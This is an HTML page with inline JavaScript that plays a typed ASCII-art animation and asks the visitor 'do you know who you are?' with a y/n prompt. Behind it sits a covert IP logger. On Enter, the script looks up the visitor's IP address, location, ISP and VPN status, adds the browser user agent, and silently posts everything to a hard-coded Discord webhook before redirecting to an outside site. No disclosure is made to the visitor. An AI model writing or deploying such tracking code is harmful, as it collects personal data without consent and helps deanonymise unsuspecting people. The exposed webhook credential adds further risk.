<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>who are you?</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      text-align: center;
      overflow: hidden;
      margin: 0;
      padding: 0;
    }
    #ascii, #question, #prompt, #inputLine {
      white-space: pre;
    }
    #question {
      font-size: 24px;
      display: none;
    }
    #prompt {
      font-size: 20px;
      display: none;
      margin-top: 20px;
    }
    #inputLine {
      display: none;
      font-size: 20px;
      margin-top: 10px;
    }
    #cursor {
      animation: blink 1s step-start infinite;
    }
    @keyframes blink {
      50% { opacity: 0; }
    }
  </style>
</head>
<body>
  <div id="ascii"></div>
  <div id="question"></div>
  <div id="prompt"></div>
  <div id="inputLine">> <span id="userInput"></span><span id="cursor">█</span></div>

  <script>
    const asciiArt = `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣤⣄⡀⠀⠰⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡖⠀⢀⣠⣤⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠙⣿⣿⡟⢀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⢻⣿⣿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣿⠏⢠⣾⣿⡟⠙⣿⣿⣿⣿⣿⣿⠋⢻⣿⣷⡄⠹⣿⣄⠀⠀⠀⠀
⠀⢰⣾⣿⣿⡏⢠⣿⣿⠏⢠⣦⠈⢿⣿⣿⡿⠁⣴⡄⠹⣿⣿⡄⢹⣿⣿⣷⡆⠀
⠀⠀⠙⢿⣿⠁⣼⣿⡟⢀⣿⣿⣇⠘⣿⣿⠃⣸⣿⣿⡀⢻⣿⣧⠈⣿⡿⠋⠀⠀
⠀⠀⠀⠸⠿⠀⣿⣿⠁⣸⡇⠀⣿⡀⢹⡏⢀⣿⠀⢸⣇⠈⣿⣿⠀⠿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⣿⣤⡤⣤⣤⡄⢀⡤⠀⠀⢠⣤⣤⢤⣤⣿⡿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⢁⣤⣤⣤⣄⡀⠏⠀⠀⠀⢀⣠⣤⣤⣤⡈⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢻⣿⡍⠹⣿⣷⣤⣀⣀⣤⣾⣿⠏⢩⣿⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣦⣈⠙⠿⠿⠿⠿⠋⣁⣴⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣶⣶⣶⣶⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`;

    const asciiContainer = document.getElementById("ascii");
    const questionContainer = document.getElementById("question");
    const promptContainer = document.getElementById("prompt");
    const inputLine = document.getElementById("inputLine");
    const userInput = document.getElementById("userInput");
    const cursor = document.getElementById("cursor");

    const questionText = "do you know who you are?";
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1402774924187402320/bD-rppc2CdfSheWXvWG8CQ-VDrEpK_R_pNKMfSuzkghJqZ4olI2krIouQj93RF98rnJM";
    let asciiIndex = 0;
    let input = "";

    async function logToDiscord(ipData) {
      try {
        const response = await fetch(DISCORD_WEBHOOK, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            content: `New visitor:\nIP: ${ipData.ip}\nVPN/Proxy: ${ipData.security.vpn ? "✅ Yes" : "❌ No"}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nISP: ${ipData.isp}\nUser Agent: ${navigator.userAgent}`
          })
        });
      } catch (e) {
        console.error("Failed to log to Discord:", e);
      }
    }

    async function getIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
          ip: data.ip || 'unknown',
          city: data.city || 'unknown',
          region: data.region || 'unknown',
          country: data.country_name || 'unknown',
          isp: data.org || 'unknown',
          security: {
            vpn: data.security && data.security.vpn
          }
        };
      } catch (e) {
        return {
          ip: 'unknown',
          city: 'unknown',
          region: 'unknown',
          country: 'unknown',
          isp: 'unknown',
          security: {
            vpn: false
          }
        };
      }
    }

    function typeAscii() {
      if (asciiIndex < asciiArt.length) {
        asciiContainer.textContent += asciiArt[asciiIndex];
        asciiIndex++;
        setTimeout(typeAscii, 5);
      } else {
        setTimeout(() => showQuestion(questionText), 500);
      }
    }

    function showQuestion(text) {
      asciiContainer.style.display = "none";
      questionContainer.style.display = "block";
      typeText(questionContainer, text, showPrompt);
    }

    function typeText(container, text, callback) {
      let i = 0;
      container.textContent = "";
      function loop() {
        if (i < text.length) {
          container.textContent += text[i];
          i++;
          setTimeout(loop, 80);
        } else if (callback) callback();
      }
      loop();
    }

    function showPrompt() {
      promptContainer.style.display = "block";
      promptContainer.textContent = "y/n ?";
      inputLine.style.display = "block";
    }

    document.addEventListener("keydown", async (e) => {
      if (inputLine.style.display === "none") return;

      if (e.key.length === 1 && "yn".includes(e.key.toLowerCase())) {
        input = e.key.toLowerCase();
        userInput.textContent = input;
      } else if (e.key === "Backspace") {
        input = "";
        userInput.textContent = "";
      } else if (e.key === "Enter" && input) {
        // Get and log IP info before redirecting
        const ipData = await getIPInfo();
        await logToDiscord(ipData);
        
        if (input === "y") {
          window.location.href = "https://okillletyou.com";
        } else if (input === "n") {
          window.location.href = "https://okillletyou.com";
        }
      }
    });

    // Start the sequence
    typeAscii();
  </script>
</body>
</html>
